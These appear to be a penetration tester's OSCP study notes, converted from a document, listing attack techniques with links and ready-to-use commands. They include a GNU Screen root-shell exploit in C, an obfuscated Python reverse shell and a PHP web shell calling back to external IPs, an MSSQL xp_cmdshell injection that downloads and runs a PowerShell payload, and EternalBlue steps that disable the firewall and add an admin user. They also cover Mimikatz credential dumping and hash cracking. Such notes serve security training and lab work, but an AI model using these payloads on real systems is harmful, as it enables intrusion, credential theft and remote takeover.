> [[https://github.com/Anon-Exploiter/SUID3NUM]{.underline}](https://github.com/Anon-Exploiter/SUID3NUM)

-   ## [[GNU Screen 4.5.0]{.underline}](https://www.exploit-db.com/exploits/41154)

> vim libhax.c
>
> cat libhax.c
>
> #include \<stdio.h\>
>
> #include \<sys/types.h\>
>
> #include \<unistd.h\>
>
> \_\_attribute\_\_ ((\_\_constructor\_\_))
>
> void dropshell(void){
>
> chown(\"/tmp/rootshell\", 0, 0);
>
> chmod(\"/tmp/rootshell\", 04755);
>
> unlink(\"/etc/ld.so.preload\");
>
> printf(\"\[+\] done!\\n\");
>
> }
>
> vim rootshell.c
>
> cat rootshell.c
>
> #include \<stdio.h\>
>
> int main(void){
>
> setuid(0);
>
> setgid(0);
>
> seteuid(0);
>
> setegid(0);
>
> execvp(\"/bin/sh\", NULL, NULL);
>
> }
>
> root@Machine1:\~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
>
> root@Machine1:\~# gcc -o rootshell rootshell.c
>
> ![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image22.png){width="6.5in"
> height="4.75in"}

# 

## Exploiting Cron Jobs -- tar Wildcard Injection

[[https://juggernaut-sec.com/cron-jobs-lpe/#Exploiting_Cron_Jobs\_%E2%80%93_tar_Wildcard_Injection]{.underline}](https://juggernaut-sec.com/cron-jobs-lpe/#Exploiting_Cron_Jobs_%E2%80%93_tar_Wildcard_Injection)

# 

# 

# 

# 

# MSFVENOM cheat Sheet

[[https://book.hacktricks.xyz/shells/shells/msfvenom]{.underline}](https://book.hacktricks.xyz/shells/shells/msfvenom)

[[https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/]{.underline}](https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/)

[[https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html]{.underline}](https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html)

**Fix samba version**

[[https://unix.stackexchange.com/questions/450986/linux-to-windows-can-list-smb-shares-but-cannot-connect]{.underline}](https://unix.stackexchange.com/questions/450986/linux-to-windows-can-list-smb-shares-but-cannot-connect)

**Reverse shell via smb login linux**

[[https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63]{.underline}](https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63)

**Reverse shell windows :**

C:\\Python27\\python.exe -c \"(lambda \_\_y, \_\_g, \_\_contextlib:
\[\[\[\[\[\[\[(s.connect((\'192.168.119.153\', 4444)),
\[\[\[(s2p_thread.start(), \[\[(p2s_thread.start(), (lambda \_\_out:
(lambda \_\_ctx: \[\_\_ctx.\_\_enter\_\_(), \_\_ctx.\_\_exit\_\_(None,
None, None), \_\_out\[0\](lambda:
None)\]\[2\])(\_\_contextlib.nested(type(\'except\', (),
{\'\_\_enter\_\_\': lambda self: None, \'\_\_exit\_\_\': lambda
\_\_self, \_\_exctype, \_\_value, \_\_traceback: \_\_exctype is not None
and (issubclass(\_\_exctype, KeyboardInterrupt) and \[True for
\_\_out\[0\] in \[((s.close(), lambda after:
after())\[1\])\]\]\[0\])})(), type(\'try\', (), {\'\_\_enter\_\_\':
lambda self: None, \'\_\_exit\_\_\': lambda \_\_self, \_\_exctype,
\_\_value, \_\_traceback: \[False for \_\_out\[0\] in \[((p.wait(),
(lambda \_\_after: \_\_after()))\[1\])\]\]\[0\]})())))(\[None\]))\[1\]
for p2s_thread.daemon in \[(True)\]\]\[0\] for \_\_g\[\'p2s_thread\'\]
in \[(threading.Thread(target=p2s, args=\[s, p\]))\]\]\[0\])\[1\] for
s2p_thread.daemon in \[(True)\]\]\[0\] for \_\_g\[\'s2p_thread\'\] in
\[(threading.Thread(target=s2p, args=\[s, p\]))\]\]\[0\] for
\_\_g\[\'p\'\] in
\[(subprocess.Popen(\[\'\\\\windows\\\\system32\\\\cmd.exe\'\],
stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
stdin=subprocess.PIPE))\]\]\[0\])\[1\] for \_\_g\[\'s\'\] in
\[(socket.socket(socket.AF_INET, socket.SOCK_STREAM))\]\]\[0\] for
\_\_g\[\'p2s\'\], p2s.\_\_name\_\_ in \[(lambda s, p: (lambda \_\_l:
\[(lambda \_\_after: \_\_y(lambda \_\_this: lambda:
(\_\_l\[\'s\'\].send(\_\_l\[\'p\'\].stdout.read(1)), \_\_this())\[1\] if
True else \_\_after())())(lambda: None) for \_\_l\[\'s\'\],
\_\_l\[\'p\'\] in \[(s, p)\]\]\[0\])({}), \'p2s\')\]\]\[0\] for
\_\_g\[\'s2p\'\], s2p.\_\_name\_\_ in \[(lambda s, p: (lambda \_\_l:
\[(lambda \_\_after: \_\_y(lambda \_\_this: lambda: \[(lambda \_\_after:
(\_\_l\[\'p\'\].stdin.write(\_\_l\[\'data\'\]), \_\_after())\[1\] if
(len(\_\_l\[\'data\'\]) \> 0) else \_\_after())(lambda: \_\_this()) for
\_\_l\[\'data\'\] in \[(\_\_l\[\'s\'\].recv(1024))\]\]\[0\] if True else
\_\_after())())(lambda: None) for \_\_l\[\'s\'\], \_\_l\[\'p\'\] in
\[(s, p)\]\]\[0\])({}), \'s2p\')\]\]\[0\] for \_\_g\[\'os\'\] in
\[(\_\_import\_\_(\'os\', \_\_g, \_\_g))\]\]\[0\] for
\_\_g\[\'socket\'\] in \[(\_\_import\_\_(\'socket\', \_\_g,
\_\_g))\]\]\[0\] for \_\_g\[\'subprocess\'\] in
\[(\_\_import\_\_(\'subprocess\', \_\_g, \_\_g))\]\]\[0\] for
\_\_g\[\'threading\'\] in \[(\_\_import\_\_(\'threading\', \_\_g,
\_\_g))\]\]\[0\])((lambda f: (lambda x: x(x))(lambda y: f(lambda:
y(y)()))), globals(), \_\_import\_\_(\'contextlib\'))\"

**Payload reverse shell :**

[[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]{.underline}](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Reverse shell via lfi :

[[https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/]{.underline}](https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/)

Create file shell.txt :

\<?php echo shell_exec(\"bash -i \>& /dev/tcp/173.249.15.168/443
0\>&1\");?\>

Alpha oscp :

[[https://forums.offensive-security.com/showthread.php?4689-Offensive-Security-s-Complete-Guide-to-Alpha/page3&p=20552#post20552]{.underline}](https://forums.offensive-security.com/showthread.php?4689-Offensive-Security-s-Complete-Guide-to-Alpha/page3&p=20552#post20552)

**NFS Enumeration :**

**[[https://hack-tips.com/2020/02/21/how-to-find-nfs-mounted-drives-penetration-testing/]{.underline}](https://hack-tips.com/2020/02/21/how-to-find-nfs-mounted-drives-penetration-testing/)**

**Then check pdf pen200 page 203**

**sudo mount -t nfs -o vers=3 10.11.1.72:/home /tmp/nfs**

**SMTP ENUM : port 25**

nmap 10.11.1.72 -p 25 \--script=smtp-\*

[[https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-smtp/README.md]{.underline}](https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-smtp/README.md)

[[https://raw.githubusercontent.com/3mrgnc3/pentest_old/master/postfix-shellshock-nc.py]{.underline}](https://raw.githubusercontent.com/3mrgnc3/pentest_old/master/postfix-shellshock-nc.py)

We\'ll choose three general SMTP auxiliary scripts and see if MSF can
acquire any data we weren\'t able to through Nmap:

msfconsole -q -x \'setg RHOSTS 10.11.1.72;

use auxiliary/scanner/smtp/smtp_enum; run;

use auxiliary/scanner/smtp/smtp_relay; run;

use auxiliary/scanner/smtp/smtp_version; run;

exit\'

Detail read pdf pen200 page 204

**[Services]{.underline}**

[**TCP 110** (Default port for POP3) :]{.underline}

[nc -nvC 10.11.1.72 110]{.underline}

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image19.png){width="5.541666666666667in"
height="2.1145833333333335in"}

**[Information Gathering]{.underline}**

**[Services]{.underline}**

[**TCP 111** (Default port for SUN RPC)]{.underline}

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image38.png){width="6.5in"
height="3.1666666666666665in"}

**[Information Gathering]{.underline}**

**[Services]{.underline}**

[**TCP 4555** (Default port for RSIP)]{.underline}

[Try login with default password root and username root]{.underline}

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image44.png){width="6.5in"
height="4.819444444444445in"}

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image28.png){width="6.5in"
height="4.388888888888889in"}

**[Malicious Information Gathering]{.underline}**

**[POP 3]{.underline}**

**[Email Harvesting]{.underline}**

**[for user in marcus john mailadmin jenny ryuu joe45; do]{.underline}**

**[( echo USER \${user}; sleep 2s; echo PASS abcd; sleep 2s; echo LIST;
sleep 2s; echo quit) \| nc -nvC 10.11.1.72 110; done]{.underline}**

**[Let\'s discuss what this code does. We create a for loop that runs
through all six email accounts we have discovered. For each account, we
prepare a sequence of four POP3 commands to pipe into
netcat:]{.underline}**

-   **[provide a known username]{.underline}**

-   **[provide our controlled password]{.underline}**

-   **[list all email messages]{.underline}**

-   **[terminate the connection]{.underline}**

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image25.png){width="6.5in"
height="4.75in"}

**[We notice that the ryuu account seems to have two emails associated
with it.]{.underline}**

**[Our next step is to log onto the ryuu account and see if we can read
the messages:]{.underline}**

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image16.png){width="6.5in"
height="5.111111111111111in"}

# Sql Injection:

## Manual SQLI

-   [**[http://lastc0de.blogspot.com/2013/07/tutorial-sql-injection-manual.html]{.underline}**](http://lastc0de.blogspot.com/2013/07/tutorial-sql-injection-manual.html)

[**[https://exploit.linuxsec.org/tutorial-sql-injection-manual/]{.underline}**](https://exploit.linuxsec.org/tutorial-sql-injection-manual/)

## SQLINJECTION ORACLE CHEATSEET

-   [**[http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html]{.underline}**](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html)

## MSSQL SQL INJECTION :

[**[https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf]{.underline}**](https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf)

[**[https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/]{.underline}**](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)

[**[https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html]{.underline}**](https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html)

**[\',convert(int,(select top(1) COLUMN_NAME from
information_schema.columns where TABLE_NAME=cast(0x6e6577736c6574746572
as varchar))))\--]{.underline}**

**[\',convert(int,(select top 1 column_name from
information_schema.columns where table_name=\'users\' and column_name
not in (\'user_id\') and column_name not in (\'username\') and
column_name not in (\'email\'))))\--]{.underline}**

**[\',convert(int,(select top 1 column_name from
information_schema.columns where
table_name=\'archieve\')))\--]{.underline}**

**[Mssql injection to rce]{.underline}**

[**[https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell-with-nishang]{.underline}**](https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell-with-nishang/)

[**[https://www.tarlogic.com/blog/red-team-tales-0x01/]{.underline}**](https://www.tarlogic.com/blog/red-team-tales-0x01/)

**[https://gist.github.com/cyberheartmi9/256df4b98af323fa96f182916f0e3d00]{.underline}**

admin\';EXEC master.dbo.xp_cmdshell \"powershell IEX(New-Object
Net.webclient).downloadString(\'[[http://192.168.119.153/]{.underline}](http://192.168.119.161/Invoke-PowerShellTcp.ps1)Invoke-PowerShellTcpOneLine.ps1\')\"\--

# 

# Password-Hash Cracking

## Crack VNC password using the default encryption key and an open-ssl one-liner.

echo -n \"6bcf2a4b6e5aca0f\" \| xxd -r -p \| openssl enc -des-cbc
\--nopad \--nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider
legacy -provider default \| hexdump -Cv

**[Hash Analyzer:
https://www.tunnelsup.com/hash-analyzer/]{.underline}**

## fcrackzip

*[fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt \<FILE\>.zip
#Cracking zip files]{.underline}*

## John

[**[https://github.com/openwall/john/tree/bleeding-jumbo/run]{.underline}**](https://github.com/openwall/john/tree/bleeding-jumbo/run)

**[Zip2john file.zip \> test.hash]{.underline}**

[**John test.hash** *\--wordlist=rockyou.txt*]{.underline}

*[john \--show test.hash \# to show the password cracked]{.underline}*

*[<https://medium.com/@ujjawal.soni2002/cracking-a-password-protected-zip-file-using-john-the-ripper-f39e657cbfa8>]{.underline}*

**[pfx2john legacyy_dev_auth.pfx \> legacy.hash]{.underline}**

*[ssh2john.py id_rsa \> hash]{.underline}*

*[#Convert the obtained hash to John format(above link)]{.underline}*

*[john hashfile \--wordlist=rockyou.txt]{.underline}*

## Hashcat

[**[https://hashcat.net/wiki/doku.php?id=example_hashes]{.underline}**](https://hashcat.net/wiki/doku.php?id=example_hashes)

*[#Obtain the Hash module number]{.underline}*

*[hashcat \--help \| grep -i \"Kerberos\"]{.underline}*

*[hashcat -m \<number\> hash wordlists.txt \--force]{.underline}*

*[sudo hashcat -m 13100 hashes.kerberoast
/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
\--force]{.underline}*

*[hashcat -m2100 \'\$DCC2\$10240#spot#3407de6ff2f044ab21711a394d85f3b8\'
/usr/share/wordlists/rockyou.txt \--force
\--potfile-disable]{.underline}*

*[hashcat -a 0 -m 2100 hash.adm
/usr/share/wordlists/rockyou.txt]{.underline}*

# Mimikatz

*[privilege::debug]{.underline}*

*[sekurlsa::logonpasswords #hashes and plaintext passwords]{.underline}*

*[sekurlsa::credman]{.underline}*

*[lsadump::sam]{.underline}*

*[lsadump::lsa /patch #both these dump SAM]{.underline}*

*[mimikatz \"lsadump::secrets\" exit]{.underline}*

*[lsadump::cache]{.underline}*

*[#OneLiner]{.underline}*

*[.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"
\"exit\"]{.underline}*

*[privilege::debug]{.underline}*

*[mimikatz token::elevate]{.underline}*

*[sekurlsa::logonpasswords]{.underline}*

*[sekurlsa::tickets]{.underline}*

# Ligolo-ng

*[#Creating interface and starting it.]{.underline}*

*[sudo ip tuntap add user \$(whoami) mode tun ligolo]{.underline}*

*[sudo ip link set ligolo up]{.underline}*

*[#Kali machine - Attacker machine]{.underline}*

*[./proxy -laddr \<LHOST\>:9001 -selfcert]{.underline}*

*[#windows or linux machine - compromised machine]{.underline}*

*[./agent -connect \<LHOST\>:9001 -ignore-cert]{.underline}*

*[#In Ligolo-ng console]{.underline}*

*[session #select host]{.underline}*

*[ifconfig #Notedown the internal network\'s subnet]{.underline}*

*[start #after adding relevent subnet to ligolo interface]{.underline}*

*[#Adding subnet to ligolo interface - Kali linux]{.underline}*

*[sudo ip r add \<subnet\> dev ligolo]{.underline}*

# ETERNALBLUE Exploitation

**[If smb has AV (anti virus or firewall active disable AV with this
code :]{.underline}**

**[service_exec(conn, r\'cmd /c netsh firewall set opmode
disable\')]{.underline}**

**[And if rdp active add user and add user to group administrator using
this command :]{.underline}**

**[service_exec(conn, r\'cmd /c net user bill pass
/add\')]{.underline}**

**[service_exec(conn, r\'cmd /c net localgroup administrators bill
/add\')]{.underline}**

**[Then add this command to get reverse shell :]{.underline}**

**[service_exec(conn, r\"cmd /c powershell iex(new-object
net.webclient).downloadstring(\'[http://192.168.119.157/](http://10.0.2.4/test.ps1)Invoke-PowerShellTcp.ps1\')\")]{.underline}**

**[Detail add this article :]{.underline}**

**[<https://redteamzone.com/EternalBlue/>]{.underline}**

[**[https://0xdf.gitlab.io/2019/02/21/htb-legacy.html]{.underline}**](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)

# GENERATE PASSWORD HASH FOR /ETC/PASSWD

[**[https://ma.ttias.be/how-to-generate-a-passwd-password-hash-via-the-command-line-on-linux/]{.underline}**](https://ma.ttias.be/how-to-generate-a-passwd-password-hash-via-the-command-line-on-linux/)

**[CHECK FRIENDS OF MACHINE]{.underline}**

**[nmap -p port 10.11.1.1-255]{.underline}**

# ESCAPING SHELL :

[**[https://www.sans.org/blog/escaping-restricted-linux-shells/]{.underline}**](https://www.sans.org/blog/escaping-restricted-linux-shells/)

[**[https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes\--Enumeration\--SSH\--rbash_shell_esacping.html]{.underline}**](https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--Enumeration--SSH--rbash_shell_esacping.html)

# 

# DOCKER PRIVILLAGE ESCALATION :

[**[https://www.hackingarticles.in/docker-privilege-escalation/]{.underline}**](https://www.hackingarticles.in/docker-privilege-escalation/)

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image39.png){width="6.5in"
height="2.3333333333333335in"}

# TFTP PORT OPEN :

**[nmap -sU -p69 \--script tftp-enum 10.11.1.111]{.underline}**

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image21.png){width="6.041666666666667in"
height="1.9791666666666667in"}

**[LIST KERNEL EXPLOTATION]{.underline}**

[**[https://github.com/anoaghost/Localroot_Compile/blob/master/README.md]{.underline}**](https://github.com/anoaghost/Localroot_Compile/blob/master/README.md)

# UPFRADING SHELL

[**[https://refabr1k.gitbook.io/oscp/privesc-linux/upgrading-shells]{.underline}**](https://refabr1k.gitbook.io/oscp/privesc-linux/upgrading-shells)

# MULTIPLE WAY TO EXPLOIT Tomcat MANAGER :

[**[https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/]{.underline}**](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)

**[WAY to search to getting application name yang running di port
tertentu]{.underline}**

**[Netstat -anb]{.underline}**

# BOF 

[**[https://www.noobsec.net/bof/]{.underline}**](https://www.noobsec.net/bof/)

[**[https://ricobandy.github.io/vulnhub/Brainpan-Vulnhub/]{.underline}**](https://ricobandy.github.io/vulnhub/Brainpan-Vulnhub/)

[**[https://offs3cg33k.medium.com/brainpan-vulnhub-walkthrough-143f1b3786c5]{.underline}**](https://offs3cg33k.medium.com/brainpan-vulnhub-walkthrough-143f1b3786c5)

[**[https://tcm-sec.com/buffer-overflows-made-easy/]{.underline}**](https://tcm-sec.com/buffer-overflows-made-easy/)

**[LDAP SEARCH]{.underline}**

**[ldapsearch -h 10.10.10.193 -x -s base namingcontexts]{.underline}**

[**[https://0xdf.gitlab.io/2020/10/31/htb-fuse.html]{.underline}**](https://0xdf.gitlab.io/2020/10/31/htb-fuse.html)

# SEARCH LOCATION FLAG in windows

**[Dir /b /s proof.txt]{.underline}**

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image40.png){width="3.1770833333333335in"
height="0.6354166666666666in"}

# WHOAMI DISABLE

**[Upload whoami.exe from kali linux or \$env:UserName]{.underline}**

# XML,TXT DECRYPT

**[\$cred = Import-CliXML -path
C:\\Data\\Users\\App\\user.txt]{.underline}**

**[\$cred.GetNetworkCredential().password]{.underline}**

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image43.png){width="6.5in"
height="3.1944444444444446in"}

# SPOOFING NLTMHASH using impacket-smbserver

**[<https://medium.com/@ardian.danny/hackthebox-escape-writeup-931dba100509>]{.underline}**

**[impacket-smbserver -smb2support kali .]{.underline}**

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image12.png){width="6.5in"
height="0.9444444444444444in"}
